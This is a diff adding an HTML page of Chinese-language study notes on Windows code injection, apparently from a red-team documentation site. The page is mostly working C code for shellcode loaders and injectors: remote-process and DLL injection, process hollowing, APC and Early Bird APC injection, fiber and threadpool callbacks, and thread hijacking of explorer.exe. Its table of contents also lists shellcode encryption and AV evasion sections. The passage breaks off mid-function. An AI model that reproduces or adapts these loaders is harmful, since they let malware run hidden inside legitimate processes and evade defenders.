@@ -1,0 +1,2743 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>代码注入学习 - Share Docs</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u4ee3\u7801\u6ce8\u5165\u5b66\u4e60", url: "#_top", children: [
+              {title: "\u672c\u5730\u8fdb\u7a0b\u6ce8\u5165", url: "#_2" },
+              {title: "\u8fdc\u7a0b\u8fdb\u7a0b\u6ce8\u5165", url: "#_3" },
+              {title: "DLL\u6ce8\u5165", url: "#dll" },
+              {title: "process doppelganging \uff08\u8fdb\u7a0b\u5206\u8eab\uff09", url: "#process-doppelganging" },
+              {title: "\u4ece\u8d44\u6e90\u8868\u8f7d\u5165shellcode", url: "#shellcode" },
+              {title: "Process Hollowing \uff08\u8fdb\u7a0b\u6316\u7a7a\uff09", url: "#process-hollowing" },
+              {title: "APC\u961f\u5217\u6ce8\u5165", url: "#apc" },
+              {title: "Early Bird APC\u6ce8\u5165", url: "#early-bird-apc" },
+              {title: "\u901a\u8fc7 QueueUserAPC\u548cNtTestAlert\u6ce8\u5165", url: "#queueuserapcnttestalert" },
+              {title: "\u4eceFibers \uff08\u7ea4\u7a0b\uff09\u8f7d\u5165shellcode", url: "#fibers-shellcode" },
+              {title: "\u901a\u8fc7\u7b49\u5f85\u5bf9\u8c61\u56de\u8c03\u51fd\u6570\u8f7d\u5165shellcode", url: "#shellcode_1" },
+              {title: "\u4ecetext\u8868\u8f7d\u5165shellcode", url: "#textshellcode" },
+              {title: "\u8fdc\u7a0b\u7ebf\u7a0b\u52ab\u6301", url: "#_4" },
+              {title: "SetWindowHookEx\u6ce8\u5165", url: "#setwindowhookex" },
+              {title: "NtCreateSection + NtMapViewOfSection\u6ce8\u5165", url: "#ntcreatesection-ntmapviewofsection" },
+              {title: "AddressOfEntryPoint Code Injection without VirtualAllocEx RWX", url: "#addressofentrypoint-code-injection-without-virtualallocex-rwx" },
+              {title: "ModuleStomping", url: "#modulestomping" },
+              {title: "Enumerating RWX Protected Memory", url: "#enumerating-rwx-protected-memory" },
+              {title: "FunctionStomping", url: "#functionstomping" },
+              {title: "TheardlessInjection", url: "#theardlessinjection" },
+              {title: "Entry Point Injection", url: "#entry-point-injection" },
+              {title: "DllNotificationInjection(2023/8)", url: "#dllnotificationinjection20238" },
+          ]},
+          {title: "Shellcode\u52a0\u89e3\u5bc6", url: "#shellcode_2", children: [
+              {title: "\u4ea6\u6216", url: "#_5" },
+              {title: "\u81ea\u5b9a\u4e49RC4", url: "#rc4" },
+              {title: "AES", url: "#aes" },
+          ]},
+          {title: "\u5176\u4ed6", url: "#_6", children: [
+              {title: "\u7a0b\u5e8f\u81ea\u5220\u9664\u529f\u80fd", url: "#_7" },
+              {title: "\u6302\u8d77Windows\u4e8b\u4ef6\u670d\u52a1", url: "#windows" },
+              {title: "\u65e0\u843d\u5730\u6587\u4ef6shellcode\uff08HTTP\u4e0b\u8f7d\uff09", url: "#shellcodehttp" },
+              {title: "PEB\u5b66\u4e60", url: "#peb" },
+              {title: "\u4f7f\u7528SetWinEventHook\u6765\u6267\u884c\u56de\u8c03\u4ee3\u7801", url: "#setwineventhook" },
+              {title: "\u5404\u79cdshellcode", url: "#shellcode_3" },
+          ]},
+          {title: "\u9632\u5fa1\u89c4\u907f", url: "#_8", children: [
+              {title: "\u8fc7\u52a8\u6001\u7684\u65b9\u5f0f", url: "#_9" },
+              {title: "\u8fc7\u9759\u6001\u7684\u65b9\u5f0f", url: "#_12" },
+              {title: "\u7ed5\u6740\u8f6fhook", url: "#hook" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/" class="btn btn-xs btn-link">
+        反调试与反虚拟机
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../svchost%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88WIN10%201703%E4%B9%8B%E5%90%8E%E6%97%A0%E6%95%88%EF%BC%89/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../svchost%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88WIN10%201703%E4%B9%8B%E5%90%8E%E6%97%A0%E6%95%88%EF%BC%89/" class="btn btn-xs btn-link">
+        svchost权限维持（WIN10 1703之后无效）
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">代码注入学习</h1>
+<h2 id="_2">本地进程注入</h2>
+<pre><code>要执行shellcode需要有一个RWX内存块。
+
+
+在本例代码中
+
+VirtualAlloc函数分配虚拟内存
+{地址, 大小, 内存类型, 内存保护}
+LPVOID VirtualAlloc(
+  [in, optional] LPVOID lpAddress,
+  [in]           SIZE_T dwSize,
+  [in]           DWORD  flAllocationType,
+  [in]           DWORD  flProtect
+);
+
+sizeof 运算符计算shellcode长度
+sizeof unary-expression
+sizeof ( type-name )
+
+memcpy 从缓冲区复制字节
+
+
+</code></pre>
+<pre><code class="language-C">#include &quot;Windows.h&quot;
+
+int main()
+{
+    unsigned char shellcode[] =
+        &quot;\x48\x31&quot;;
+
+    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    
+    memcpy(exec, shellcode, sizeof shellcode);
+    ((void(*)())exec)();
+
+    return 0;
+}
+
+</code></pre>
+<h2 id="_3">远程进程注入</h2>
+<p>本地进程注入启动的当前进程，远程进程注入是可以将代码注入到其他进程</p>
+<pre><code>OpenProcess 获取进程的句柄
+VirtualAllocEx 在指定进程虚拟空间申请虚拟内存
+WriteProcessMemory 往进程的虚拟内存写入shellcode
+CreateRemoteThread 在远程进程上创建线程
+
+</code></pre>
+<pre><code class="language-C">#include &quot;Windows.h&quot;
+
+int main(int argc, char *argv[])
+{
+    unsigned char shellcode[] =
+        &quot;\x48&quot;;
+
+    HANDLE processHandle;
+    HANDLE remoteThread;
+    PVOID remoteBuffer;
+
+    printf(&quot;Injecting to PID: %i&quot;, atoi(argv[1]));
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+    CloseHandle(processHandle);
+
+    return 0;
+}
+</code></pre>
+<p><img alt="" src="../../images/20230706150630.png" /></p>
+<h2 id="dll">DLL注入</h2>
+<p>将dll注入到远程进程，流程和远程进程注入差不多</p>
+<pre><code class="language-C">int main(int argc, char *argv[]) {
+    HANDLE processHandle;
+    PVOID remoteBuffer;
+    wchar_t dllPath[] = TEXT(&quot;C:\\experiments\\evilm64.dll&quot;);
+
+    printf(&quot;Injecting DLL to PID: %i\n&quot;, atoi(argv[1]));
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE); 
+    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
+    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;);
+    CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
+    CloseHandle(processHandle); 
+
+    return 0;
+}
+</code></pre>
+<h2 id="process-doppelganging">process doppelganging （进程分身）</h2>
+<pre><code>
+https://github.com/hasherezade/process_doppelganging
+</code></pre>
+<h2 id="shellcode">从资源表载入shellcode</h2>
+<pre><code class="language-C">#pragma comment(linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)
+
+#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &quot;resource.h&quot;
+
+int main()
+{
+    // IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode
+    // METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin
+    HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD_BIN1), L&quot;payload_bin&quot;);
+    DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
+    HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);
+
+    void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, shellcodeResouceData, shellcodeSize);
+    ((void(*)())exec)();
+
+    return  0;
+}
+</code></pre>
+<p><code>导入自定义资源</code>
+<img alt="" src="../../images/20230706154301.png" /></p>
+<p><code>类型名称要对应</code>
+<img alt="" src="../../images/20230706154356.png" /></p>
+<p>可看到shellcode被存储到了资源表中
+<img alt="" src="../../images/20230706154225.png" /></p>
+<p>![[../images/20230706154501.png]]</p>
+<h2 id="process-hollowing">Process Hollowing （进程挖空）</h2>
+<p>代码没测试成功，先放着</p>
+<pre><code class="language-C">
+本例代码中
+
+CreateProcessA函数  创建进程
+BOOL CreateProcessA(
+  [in, optional]      LPCSTR                lpApplicationName, 执行的程序名称
+  [in, out, optional] LPSTR                 lpCommandLine,   执行的命令
+  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,  一般NULL
+  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,  一般NULL
+  [in]                BOOL                  bInheritHandles,     
+  [in]                DWORD                 dwCreationFlags,     进程标志
+  [in, optional]      LPVOID                lpEnvironment,      
+  [in, optional]      LPCSTR                lpCurrentDirectory,
+  [in]                LPSTARTUPINFOA        lpStartupInfo,   STARTUPINFOA结构体，指定创建时进程的主窗口的窗口工作站、桌面、标准句柄和外观。
+  [out]               LPPROCESS_INFORMATION lpProcessInformation     PROCESS_INFORMATION结构体,句柄及线程信息
+);
+
+
+NtQueryInformationProcess函数  检索有关指定进程的信息。
+
+
+</code></pre>
+<pre><code>// process-hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
+
+#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;winternl.h&gt;
+
+using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);
+
+typedef struct BASE_RELOCATION_BLOCK {
+    DWORD PageAddress;
+    DWORD BlockSize;
+} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;
+
+typedef struct BASE_RELOCATION_ENTRY {
+    USHORT Offset : 12;
+    USHORT Type : 4;
+} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
+
+int main()
+{
+    // create destination process - this is the process to be hollowed out
+    LPSTARTUPINFOA si = new STARTUPINFOA();
+    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+    PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
+    DWORD returnLenght = 0;
+    CreateProcessA(NULL, (LPSTR)&quot;c:\\windows\\syswow64\\notepad.exe&quot;, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
+    HANDLE destProcess = pi-&gt;hProcess;
+
+    // get destination imageBase offset address from the PEB
+    NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &amp;returnLenght);
+    DWORD pebImageBaseOffset = (DWORD)pbi-&gt;PebBaseAddress + 8;
+
+    // get destination imageBaseAddress
+    LPVOID destImageBase = 0;
+    SIZE_T bytesRead = NULL;
+    ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &amp;destImageBase, 4, &amp;bytesRead);
+
+    // read source file - this is the file that will be executed inside the hollowed process
+    HANDLE sourceFile = CreateFileA(&quot;c:\\windows\\syswow64\\notepad.exe&quot;, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
+    DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
+    LPDWORD fileBytesRead = 0;
+    LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
+    ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
+
+    // get source image size
+    PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
+    PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders-&gt;e_lfanew);
+    SIZE_T sourceImageSize = sourceImageNTHeaders-&gt;OptionalHeader.SizeOfImage;
+
+    // carve out the destination image
+    NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtUnmapViewOfSection&quot;));
+    myNtUnmapViewOfSection(destProcess, destImageBase);
+
+    // allocate new memory in destination image for the source image
+    LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    destImageBase = newDestImageBase;
+
+    // get delta between sourceImageBaseAddress and destinationImageBaseAddress
+    DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders-&gt;OptionalHeader.ImageBase;
+
+    // set sourceImageBase to destImageBase and copy the source Image headers to the destination image
+    sourceImageNTHeaders-&gt;OptionalHeader.ImageBase = (DWORD)destImageBase;
+    WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders-&gt;OptionalHeader.SizeOfHeaders, NULL);
+
+    // get pointer to first source image section
+    PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS32));
+    PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
+    int err = GetLastError();
+
+    // copy source image sections to destination
+    for (int i = 0; i &lt; sourceImageNTHeaders-&gt;FileHeader.NumberOfSections; i++)
+    {
+        PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection-&gt;VirtualAddress);
+        PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection-&gt;PointerToRawData);
+        WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection-&gt;SizeOfRawData, NULL);
+        sourceImageSection++;
+    }
+
+    // get address of the relocation table
+    IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+    // patch the binary with relocations
+    sourceImageSection = sourceImageSectionOld;
+    for (int i = 0; i &lt; sourceImageNTHeaders-&gt;FileHeader.NumberOfSections; i++)
+    {
+        BYTE* relocSectionName = (BYTE*)&quot;.reloc&quot;;
+        if (memcmp(sourceImageSection-&gt;Name, relocSectionName, 5) != 0)
+        {
+            sourceImageSection++;
+            continue;
+        }
+
+        DWORD sourceRelocationTableRaw = sourceImageSection-&gt;PointerToRawData;
+        DWORD relocationOffset = 0;
+
+        while (relocationOffset &lt; relocationTable.Size) {
+            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
+            relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
+            DWORD relocationEntryCount = (relocationBlock-&gt;BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
+            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
+
+            for (DWORD y = 0; y &lt; relocationEntryCount; y++)
+            {
+                relocationOffset += sizeof(BASE_RELOCATION_ENTRY);
+
+                if (relocationEntries[y].Type == 0)
+                {
+                    continue;
+                }
+
+                DWORD patchAddress = relocationBlock-&gt;PageAddress + relocationEntries[y].Offset;
+                DWORD patchedBuffer = 0;
+                ReadProcessMemory(destProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &amp;patchedBuffer, sizeof(DWORD), &amp;bytesRead);
+                patchedBuffer += deltaImageBase;
+
+                WriteProcessMemory(destProcess, (PVOID)((DWORD)destImageBase + patchAddress), &amp;patchedBuffer, sizeof(DWORD), fileBytesRead);
+                int a = GetLastError();
+            }
+        }
+    }
+
+    // get context of the dest process thread
+    LPCONTEXT context = new CONTEXT();
+    context-&gt;ContextFlags = CONTEXT_INTEGER;
+    GetThreadContext(pi-&gt;hThread, context);
+
+    // update dest image entry point to the new entry point of the source image and resume dest image thread
+    DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders-&gt;OptionalHeader.AddressOfEntryPoint;
+    context-&gt;Eax = patchedEntryPoint;
+    SetThreadContext(pi-&gt;hThread, context);
+    ResumeThread(pi-&gt;hThread);
+
+    return 0;
+}
+
+</code></pre>
+<h2 id="apc">APC队列注入</h2>
+<p>队列会定期枚举，定期调用shellcode</p>
+<pre><code class="language-C">#pragma comment(linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)
+#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+#include &lt;vector&gt;
+
+int main()
+{
+    unsigned char buf[] = 
+        &quot;\xff&quot;;
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
+    HANDLE victimProcess = NULL;
+    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
+    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
+    std::vector&lt;DWORD&gt; threadIds;
+    SIZE_T shellSize = sizeof(buf);
+    HANDLE threadHandle = NULL;
+
+    if (Process32First(snapshot, &amp;processEntry)) {
+        while (_wcsicmp(processEntry.szExeFile, L&quot;explorer.exe&quot;) != 0) {
+            Process32Next(snapshot, &amp;processEntry);
+        }
+    }
+
+    victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
+    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
+    WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
+
+    if (Thread32First(snapshot, &amp;threadEntry)) {
+        do {
+            if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
+                threadIds.push_back(threadEntry.th32ThreadID);
+            }
+        } while (Thread32Next(snapshot, &amp;threadEntry));
+    }
+
+    for (DWORD threadId : threadIds) {
+        threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
+        QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
+        Sleep(1000 * 2);
+    }
+
+    return 0;
+}
+</code></pre>
+<p><img alt="" src="../../images/20230706172921.png" /></p>
+<h2 id="early-bird-apc">Early Bird APC注入</h2>
+<pre><code>由于是新起了一个进程，将恶意APC对象加到进程的线程中，所以会以启动进程的身份启动恶意代码
+
+
+本例中用到的函数
+QueueUserAPC  将APC对象添加到指定线程的APC队列
+ResumeThread  唤醒线程
+</code></pre>
+<pre><code class="language-C">#include &lt;Windows.h&gt;
+
+int main()
+{
+    unsigned char buf[] = 
+        &quot;\xff&quot;;
+
+
+    SIZE_T shellSize = sizeof(buf);
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+
+    CreateProcessA(&quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);  //起一个挂起状态的notepad进程
+    HANDLE victimProcess = pi.hProcess;  //获取notepad进程的进程句柄
+    HANDLE threadHandle = pi.hThread;    //获取notepad进程的线程句柄
+
+    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);   //在notepad进程中分配一个虚拟内存
+    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
+// 为指定的虚拟内存块分配一个APC对象类型
+    WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
+    // 往虚拟内存写入shellcode
+    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
+    // 将包含shellcode的APC对象分配给notepad的线程
+    ResumeThread(threadHandle);  //唤醒线程，将启动APC队列执行shellcode
+
+    return 0;
+}
+</code></pre>
+<p><img alt="" src="../../images/20230707164807.png" /></p>
+<h2 id="queueuserapcnttestalert">通过 QueueUserAPC和NtTestAlert注入</h2>
+<pre><code class="language-C">#pragma comment(linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)
+#include &lt;Windows.h&gt;
+#pragma comment(lib, &quot;ntdll&quot;)
+using myNtTestAlert = NTSTATUS(NTAPI*)();
+
+int main()
+{
+    unsigned char buf[] = 
+        &quot;\xfc&quot;;
+
+    myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtTestAlert&quot;));
+    SIZE_T shellSize = sizeof(buf);
+    LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    WriteProcessMemory(GetCurrentProcess(), shellAddress, buf, shellSize, NULL);
+
+    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
+    QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
+    testAlert();
+
+    return 0;
+}
+</code></pre>
+<p><img alt="" src="../../images/20230707150315.png" /></p>
+<h2 id="fibers-shellcode">从Fibers （纤程）载入shellcode</h2>
+<pre><code>用一个纤程启动另一个恶意纤程
+纤程是比线程更小一级的单位
+
+本例中用到的函数
+ConvertThreadToFiber  当前主线程转换为纤程
+CreateFiber  创建纤程，创建的纤程不会启动
+SwitchToFiber  调用纤程以便启动
+
+</code></pre>
+<pre><code class="language-C">#include &lt;Windows.h&gt;
+
+int main()
+{
+    //convert main thread to fiber
+        PVOID mainFiber = ConvertThreadToFiber(NULL);
+
+    unsigned char shellcode[] = 
+        &quot;\xfc&quot;;
+
+    PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);   //分配虚拟内存
+    memcpy(shellcodeLocation, shellcode, sizeof shellcode);  //shellcode复制到虚拟内存
+
+    //  create a fiber that will execute the shellcode
+        PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);
+
+    // manually schedule the fiber that will execute our shellcode
+        SwitchToFiber(shellcodeFiber);
+
+    return 0;
+}
+
+</code></pre>
+<p><img alt="" src="../../images/20230707160849.png" /></p>
+<h2 id="shellcode_1">通过等待对象回调函数载入shellcode</h2>
+<pre><code>设置一个对象，设置一个等待对象的回调函数(含shellcode)，将对象设置一直等待，执行回调函数(shellcode)
+
+本例中用到的函数
+CreateEvent  创建一个事件对象，返回事件句柄
+RtlMoveMemory  复制内存块，目标，源
+CreateThreadpoolWait  创建等待对象
+SetThreadpoolWait   设置等待对象
+WaitForSingleObject  检查当前状态
+
+</code></pre>
+<pre><code class="language-C">#include &lt;windows.h&gt;
+#include &lt;threadpoolapiset.h&gt;
+
+unsigned char shellcode[] =
+&quot;\xfc&quot;;
+
+
+int main()
+{
+    HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
+    LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    RtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode));
+
+    PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);
+    SetThreadpoolWait(threadPoolWait, event, NULL);
+    WaitForSingleObject(event, INFINITE);
+
+    return 0;
+}
+</code></pre>
+<p><img alt="" src="../../images/20230707162921.png" /></p>
+<h2 id="textshellcode">从text表载入shellcode</h2>
+<pre><code class="language-C">#pragma section(&quot;.text&quot;)
+
+__declspec(allocate(&quot;.text&quot;)) char goodcode[] =
+&quot;\xfc;
+
+int main()
+{
+    (*(void(*)())(&amp;goodcode))();
+}
+
+</code></pre>
+<h2 id="_4">远程线程劫持</h2>
+<pre><code>指定远程进程，枚举进程的线程并劫持。
+被劫持的进程会卡死。
+可枚举当前进程指定一个进程名，或新起一个进程。
+
+
+</code></pre>
+<p>枚举指定进程名以便注入</p>
+<pre><code class="language-C">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+#include &lt;stdio.h&gt;
+
+
+DWORD GetProcessIdByName(const wchar_t* processName) {
+    DWORD pid = 0;
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W processEntry;
+        processEntry.dwSize = sizeof(PROCESSENTRY32W);
+        if (Process32FirstW(snapshot, &amp;processEntry)) {
+            do {
+                if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
+                    pid = processEntry.th32ProcessID;
+                    break;
+                }
+            } while (Process32NextW(snapshot, &amp;processEntry));
+        }
+        CloseHandle(snapshot);
+    }
+    return pid;
+}  //枚举进程名获取PID
+
+int main()
+{
+    unsigned char shellcode[] =
+
+        &quot;\xfc&quot;;
+
+    HANDLE targetProcessHandle;
+    PVOID remoteBuffer;
+    HANDLE threadHijacked = NULL;
+    HANDLE snapshot;
+    THREADENTRY32 threadEntry;
+    CONTEXT context;
+
+    const wchar_t* processName = L&quot;explorer.exe&quot;;
+    DWORD targetPID = GetProcessIdByName(processName);  //得到PID
+    //DWORD targetPID = 5440;
+    context.ContextFlags = CONTEXT_FULL;
+    threadEntry.dwSize = sizeof(THREADENTRY32);
+
+    targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
+    remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    Thread32First(snapshot, &amp;threadEntry);
+
+    while (Thread32Next(snapshot, &amp;threadEntry))
+    {
+        if (threadEntry.th32OwnerProcessID == targetPID)
+        {
+            threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
+            break;
+        }
+    }
+
+    SuspendThread(threadHijacked);
+
+    GetThreadContext(threadHijacked, &amp;context);
+    context.Rip = (DWORD_PTR)remoteBuffer;
+    SetThreadContext(threadHijacked, &amp;context);
+
+    ResumeThread(threadHijacked);
+}
+
+</code></pre>
+<p>创建一个后台进程注入</p>
+<pre><code class="language-C">#pragma comment(linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)
+#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+#include &lt;stdio.h&gt;
+
+int main()
+{
+    unsigned char shellcode[] =
+
+        &quot;\xfc&quot;;
+
+    HANDLE targetProcessHandle;
+    PVOID remoteBuffer;
+    HANDLE threadHijacked = NULL;
+    HANDLE snapshot;
